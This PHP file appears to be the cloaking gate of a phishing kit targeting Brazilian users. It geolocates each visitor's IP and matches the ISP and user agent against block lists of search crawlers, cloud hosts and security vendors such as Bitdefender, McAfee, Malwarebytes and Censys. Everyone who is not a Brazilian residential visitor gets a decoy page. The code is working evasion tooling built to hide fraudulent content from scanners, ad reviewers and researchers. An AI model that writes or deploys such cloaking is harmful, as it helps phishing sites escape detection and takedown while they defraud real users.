<?php
session_start();

$userAgent = $_SERVER['HTTP_USER_AGENT'];

$BLOCK_ISP = array('Google LLC', 'Sterpu', 'Desconhecido', 'Beijing', 'Transit', 'Skyway', 'CJSC', 'Services', 'EVANZO', 'networksdelmanana.com', 'WhiteLabelColo', 'Cybersecurity', 'Squarespace', 'GleSYS', 'Bank', 'Hivelocity', 'Corporation', 'Cyberzone', 'Guanghuan', 'China', 'Online S.A.S', 'VIETEL', 'Shenzhen', 'Vikings', 'Zayo', 'Bitdefender', 'ARABIAN', 'Versatel', 'Cox', 'Verizon', 'Innsbrucker', 'Muenchen', 'Stanford', 'British', 'AS174', 'tzulo', 'Cogent', 'LeaseWeb', 'BT Public', 'Amazon.com', 'Hostinger', 'GetNet', 'Oracle', 'Onion', 'Palo', 'SAKURA', 'Akamai', 'FranTech', 'Emerald', 'Oculus', 'QuickPacket', 'DataCamp', 'HostRoyale', 'CenturyLink', 'Geekyworks', '31173', 'EGIHosting', 'Chrome', 'Googlebot', 'googleweblight', 'SIA VEESP', 'Facebook', 'facebook', 'facebookexternalhit', 'Facebot', 'external', 'GoDaddy', 'Hosting', 'amazonaws', 'Amazon ', 'Amazon Technologies Inc.', 'AdsBot', 'Microsoft', 'Yahoo', 'Qnax Ltda', 'AVAST', 's.r.o', 'DigitalOcean', 'Digital Ocean', 'proxy', 'Maxihost', 'Heficed', 'Censys', 'Locaweb', 'USA,', 'Volarehost', 'M247', 'OVH', 'Linode', 'LLC');
$BLOCK_USER = array('facebookexternalhit', 'facebook', 'external', 'face', 'hit', 'Facebot', 'APIs-Google', 'Mediapartners-Google', 'AdsBot-Google-Mobile', 'AdsBot-Google', 'Googlebot', 'Mediapartners-Google', 'AdsBot-Google-Mobile-Apps', 'FeedFetcher-Google', 'Google-Read-Aloud', 'DuplexWeb-Google', 'Google Favicon', 'googleweblight', 'Storebot-Google', 'Chrome-Lighthouse', 'Bingbot', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'zonealarm', 'malwarebytes', 'antivirus', 'panda', 'mcafee', 'linuxshield', 'esafe', 'drivesentry', 'bitdefender', 'avira', 'sentry', 'acoonbot', 'adbeat_bot', 'addsearchbot', 'addthis', 'adidxbot', 'admantx', 'adscanner', 'zabbix', 'zgrab', 'zoombot', 'zoominfobot', 'zumbot', 'zuperlistbot');
$freepais = array('Brazil');

if (!function_exists('getIp')) {
    function getIp() {
        foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key) {
            if (array_key_exists($key, $_SERVER) === true) {
                foreach (explode(',', $_SERVER[$key]) as $IPaddress) {
                    $IPaddress = trim($IPaddress);
                    if (filter_var($IPaddress, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                        return $IPaddress;
                    }
                }
            }
        }
        return null;
    }
}

$ip = getIp();


if (!isset($_SESSION['region']) || !isset($_SESSION['ISP'])) {
    $details = json_decode(file_get_contents("http://ipwho.is/$ip"));

    if ($details && $details->success == true) {
        $pais = $details->country;
        $cidade = $details->city;
        $estado = $details->region_code;
        $ISP = isset($details->connection->isp) ? $details->connection->isp : 'Desconhecido';
        $UF = $details->region_code;

        if ($UF == '') {
            $UF = 'SP';
        }

        $_SESSION['pais'] = $pais;
        $_SESSION['cidade'] = $cidade;
        $_SESSION['estado'] = $estado;
        $_SESSION['ISP'] = $ISP;
        $_SESSION['region'] = $UF;
    } else {
        $_SESSION['session_bot'] = false;
        include_once "./mob.html";
        exit;
    }
}

function checkPattern($patterns, $string) {
    return preg_match(sprintf('/%s/i', implode('|', $patterns)), $string);
}

$blockISP = isset($_SESSION['ISP']) ? checkPattern($BLOCK_ISP, $_SESSION['ISP']) : false;
$blockUserAgent = checkPattern($BLOCK_USER, $userAgent);
$freepaisCheck = isset($_SESSION['pais']) ? checkPattern($freepais, $_SESSION['pais']) : false;

if (!$blockISP && !$blockUserAgent && $freepaisCheck) {
    $_SESSION['session_bot'] = true;
} else {  
     include_once "./mob.html";
     exit;
}


function detectarDispositivo() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $dispositivo = '';

    $regexDispositivosMoveis = '/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mitsu|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i';
    $regexTablets = '/(tablet|ipad|playbook)|(android(?!.*mobile))/i';
    $regexComputadores = '/(windows|macintosh|linux|x11)/i';

    if (preg_match($regexDispositivosMoveis, $userAgent)) {
        $dispositivo = 'Celular';
    } else if (preg_match($regexTablets, $userAgent)) {
        $dispositivo = 'Tablet';
    } else if (preg_match($regexComputadores, $userAgent)) {
        $dispositivo = 'Computador';
    } else {
        $dispositivo = 'Desconhecido';
    }

    return $dispositivo;
}
$tipoDispositivo = detectarDispositivo();
